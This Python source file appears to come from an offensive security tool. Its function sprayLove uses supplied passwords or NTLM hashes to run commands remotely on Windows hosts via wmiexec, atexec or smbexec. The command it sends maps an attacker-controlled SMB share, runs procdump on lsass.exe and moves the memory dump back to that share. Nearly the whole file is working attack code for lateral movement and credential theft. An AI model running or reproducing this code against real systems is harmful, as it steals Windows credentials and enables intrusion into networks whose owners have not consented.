# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging
import wmiexec, atexec, smbexec
from core.Utils import *
from core.SmbConnection import *
from core.Colors import *
from core.Arch import *


def sprayLove(user, target, methods, local_ip, alea):
    if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
    smb_share_name = gen_random_string(5)
    
    payload = """for /f "tokens=1,2 delims= " ABCDA in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do net use \\\\%s\\%s /persistent:no /user:%s %s & \\\\%s\\%s\\procdump\\procdump%s.exe -accepteula -ma EFGHB C:\\%s.dmp & move C:\\%s.dmp \\\\%s\\%s\\dumps\\%s.dmp & echo 'TOTHEMOON'""" % (local_ip, alea, alea, alea, local_ip, alea, get_os_arch(target), alea, alea, local_ip, alea, target)

    exec_method = None

    for method in methods:
        if method == 'wmiexec':
            smbConnection = SmbConnection()
            if smbConnection.create_conn_obj(target):
                try:
                    exec_method = wmiexec.WMIEXEC(target, smb_share_name, user.username, user.password, user.domain, smbConnection.smbConnection, hashes=user.lmhash + ':' + user.nthash, share="C$")
                    logging.info("%s%s: %swmiexec%s seems to be an %sOK%s method." % (infoYellow, target, green, white, green, white))
                    break
                except Exception as e:
                    logging.info("%s%s: %swmiexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
                    logging.info("%s%s: %s" % (infoYellow, target, e))
                    continue
            else:
                logging.warning("%s%s: %sFailed to create a SMB Connection. Aborting." % (warningRed, target, red, white))
        elif method == 'atexec':
            try:
                exec_method = atexec.TSCH_EXEC(target, smb_share_name, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash)
                logging.info("%s%s: %satexec%s seems to be an %sOK%s method." % (infoYellow, target, green, white, green, white))
                break
            except Exception as e:
                logging.info("%s%s: %satexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
                logging.info("%s%s: %s" % (infoYellow, target, e))
                continue
        else:
            try:
                exec_method = smbexec.SMBEXEC(target, smb_share_name, 445, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, "C$")
                logging.info("%s%s: %ssmbexec%s seems to be an %sOK%s method." % (infoYellow, target, green, white, green, white))
                break
            except Exception as e:
                logging.info("%s%s: %ssmbexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
                logging.info("%s%s: %s" % (infoYellow, target, e))
                continue

    if exec_method : output = u'{}'.format(exec_method.execute(payload, alea, output=True).strip())
